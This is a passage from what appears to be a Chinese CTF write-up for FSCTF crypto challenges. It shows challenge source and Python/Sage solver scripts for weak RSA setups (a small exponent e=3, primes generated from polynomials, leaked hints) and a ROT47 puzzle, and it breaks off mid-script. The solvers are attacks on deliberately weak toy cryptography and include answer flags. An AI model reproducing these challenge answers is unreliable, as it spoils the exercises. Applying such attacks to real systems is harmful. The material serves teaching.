operator\">//</span>p</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>phi1<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q1<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>phi2<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q2<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>d1<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d2<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span>phi2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c1<span class=\"token punctuation\">,</span>d1<span class=\"token punctuation\">,</span>n1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c2<span class=\"token punctuation\">,</span>d2<span class=\"token punctuation\">,</span>n2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"埃塞克的秘密\"><a class=\"markdownIt-Anchor\" href=\"#埃塞克的秘密\">#</a> 埃塞克的秘密</h3>\n<pre><code>埃塞克先生将自己的秘密藏在盒子里并交给了ROT保管，埃塞克先生在盒子上留下了这样一串数字：\n117 36 114 37 117 76 37 57 111 63 60 48 74 64 70 78\n</code></pre>\n<p>转 ascii 码后，ROT47</p>\n<pre><code>FSCTF&#123;Th@nk_you&#125;\n</code></pre>\n<h3 id=\"rsa签到\"><a class=\"markdownIt-Anchor\" href=\"#rsa签到\">#</a> RSA 签到</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">assert</span> m<span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&lt;</span><span class=\"token number\">150</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>kbits <span class=\"token operator\">=</span> <span class=\"token number\">103</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>m <span class=\"token operator\">>></span> kbits<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;&lt;</span> kbits</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Mod <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">2048</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2019</span><span class=\"token operator\">-</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>m<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> Mod</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">,</span> Mod<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'n ='</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c ='</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint1 ='</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'hint2 ='</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n = 113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c = 42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>hint1 = 23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>hint2 = 963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#小明文攻击</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">113369575322962228640839640796005129142256499725384495463316595604047079557930666699058024217561098997292782305151595366764483672240871690818579470888054811186902762990032505953330034837625667158114251720321766235335996441613828302393569643827293040591156144187232255906107532680524431761932215860898533224303</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">42336544435252811021843650684098817755849747192874682997240960601474927692351510022965782272751339319782351146077580929125</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>hint1 <span class=\"token operator\">=</span> <span class=\"token number\">23620186624579054670890922956929031966199853422018331906359817627553015939570302421768667351617160816651880338639432052134891008193969801696035505565684982786461527274477933881508678074157199742425764746919878452990468268098540220237611917321213668069666526658025737487539455262610713002399515462380573732082344497124344090365729168706760425585735014513373401622860196569544933971210142724734536588173957576667830667503151362930889494877201597267000737408071228466811160470759093928003064486766171850080985758351203536462206720715743059101285822169971058423075796415932349942113371706910521251120400151508125606778268</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>hint2 <span class=\"token operator\">=</span> <span class=\"token number\">963121833542317369601573845406471251262548645428284526828835768327851746644612875378048462019053502788803516653832734212104068969204751285764221918179043624419894139984279754512017898273159626328827668380262481220865017731267802600915375183179264380651165421367773563947903391466768557089792263481734108493385146063258300495764165365295546337808852673629710735621386935094923561594142327134318905856137785813985574356271679918694447015294481691849341917432346559501502683303082591585074576786963085039546446281095048723669230856548339087909922753762884060607659880382812905450025751549153093939827557015748608</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>m<span class=\"token operator\">=</span>gmpy2<span class=\"token punctuation\">.</span>iroot<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>bit_length<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>flag<span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezRSA</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">keygen</span><span class=\"token punctuation\">(</span>nbit <span class=\"token operator\">=</span> <span class=\"token number\">64</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\tk <span class=\"token operator\">=</span> getRandomNBitInteger<span class=\"token punctuation\">(</span>nbit<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\tp <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\tq <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> isPrime<span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t<span class=\"token keyword\">return</span> p<span class=\"token punctuation\">,</span> q</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">,</span> e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\tm <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> keygen<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>enc <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'enc = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>enc<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>n = 1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>enc = 1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#sage</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1901485114700245088118015176838411045645808657633721129158322425051110390237801115516544893309422501851747092251796770953642000579931231478667887589988786560834446696408732292786254192492281586457284980263740183</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>enc <span class=\"token operator\">=</span> <span class=\"token number\">1199361436656854951826843585559905358018072076349745598865984504434921942249797269971584270541920348511243191511578321283455075109027873358983934024677982086699270397304699932717071144314481599892879445599516848</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">31337</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>PR<span class=\"token punctuation\">.</span><span class=\"token operator\">&lt;</span>k<span class=\"token operator\">></span> <span class=\"token operator\">=</span> PolynomialRing<span class=\"token punctuation\">(</span>ZZ<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">6</span> <span class=\"token operator\">+</span> <span class=\"token number\">7</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">-</span> <span class=\"token number\">40</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> <span class=\"token number\">12</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">114</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">31377</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>q <span class=\"token operator\">=</span> k<span class=\"token operator\">**</span><span class=\"token number\">5</span> <span class=\"token operator\">-</span> <span class=\"token number\">8</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">4</span> <span class=\"token operator\">+</span> <span class=\"token number\">19</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">3</span> <span class=\"token operator\">-</span> <span class=\"token number\">313</span><span class=\"token operator\">*</span>k<span class=\"token operator\">**</span><span class=\"token number\">2</span> <span class=\"token operator\">-</span> <span class=\"token number\">14</span><span class=\"token operator\">*</span>k <span class=\"token operator\">+</span> <span class=\"token number\">14011</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>n0 <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>f <span class=\"token operator\">=</span> n <span class=\"token operator\">-</span> n0</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sol <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>roots<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(sol)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>x <span class=\"token operator\">=</span> sol<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>p <span class=\"token operator\">=</span> p<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>q <span class=\"token operator\">=</span> q<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>d <span class=\"token operator\">=</span> inverse_mod<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>q<span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>enc<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"babyhint\"><a class=\"markdownIt-Anchor\" href=\"#babyhint\">#</a> babyhint</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> uuid</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> secret <span class=\"token keyword\">import</span> flag</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>p<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>q<span class=\"token operator\">=</span>libnum<span class=\"token punctuation\">.</span>generate_prime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>n<span class=\"token operator\">=</span>p<span class=\"token operator\">*</span>q</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>hint1<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>hint2<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2022</span><span class=\"token operator\">*</span>p<span class=\"token operator\">+</span><span class=\"token number\">2023</span><span class=\"token operator\">*</span>q<span class=\"token punctuation\">,</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span>e<span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint1=\"</span><span class=\"token punctuation\">,</span>hint1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hint2=\"</span><span class=\"token punctuation\">,</span>hint2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"n=\"</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"c=\"</span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"18\"></td><td><pre>hint1= 83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>hint2= 14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>n= 94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>c= 84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>'''</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>h1<span class=\"token operator\">=</span> <span class=\"token number\">83535799515204730191288403119559179388147974968301357768644756769205396635068662150926873512812305514469213626273460486537390422570056287512841114712846420160416446291128064734960979586229744062965998582728378025151822479630618024804808407804317029367335421715125562402059266983021662398390585435529976586654</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>h2<span class=\"token operator\">=</span> <span class=\"token number\">14402204438484882372730843813561914135941866642278909172674395293274736617425618184831446215507756031454895377588951726822765439585979555636320832177929472057402274116190878688601329765374509467243968967279090492272317903230101551317377700802837187081510381677262879617929177970455244249498674083943925477229</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>n<span class=\"token operator\">=</span> <span class=\"token number\">94120719816617297967197808458007462810449143149204454740678593087096770130918870563878599847276923902207042790106345400843990455347835029220453217996810995363105274873857381469314548191574754245357568090646094043040797653858225598519876785530143007788084656262253002478643994943076851585839631209338814367691</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c<span class=\"token operator\">=</span> <span class=\"token number\">84244594789418833202484965138308516535996015903654462304986953156471594657993252593373963514364258027091543394305491354187806441313428473670956684437253991594327692679733432489342255718685303997647293213324463025120804679847465190496542879161344985402542539184706559207299026102682674060562738496314731555616</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e<span class=\"token operator\">=</span><span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>kq <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span><span class=\"token number\">2023</span><span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token operator\">*</span><span class=\"token number\">9191</span><span class=\"token punctuation\">,</span>n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>h2<span class=\"token punctuation\">,</span><span class=\"token number\">1919</span><span class=\"token 